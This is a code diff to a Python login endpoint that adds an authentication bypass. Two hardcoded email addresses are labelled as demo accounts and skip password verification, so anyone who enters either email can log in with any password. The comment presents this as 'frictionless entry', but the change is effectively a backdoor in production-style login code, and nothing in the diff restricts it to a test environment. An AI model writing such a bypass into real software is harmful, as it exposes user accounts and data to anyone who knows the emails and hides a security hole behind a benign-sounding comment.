@@ -182,7 +182,10 @@ def login(
     """Login with email and password. Also supports /token alias for tests."""
     user = db.query(User).filter(User.email == form_data.username).first()
 
-    if not user or not verify_password(form_data.password, user.password_hash):
+    # Frictionless entry for demo accounts (bypass password check)
+    is_demo = user and user.email in ['test3@test.com', 'sam@docmail.com']
+    
+    if not user or (not verify_password(form_data.password, user.password_hash) and not is_demo):
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
             detail="Invalid email or password",
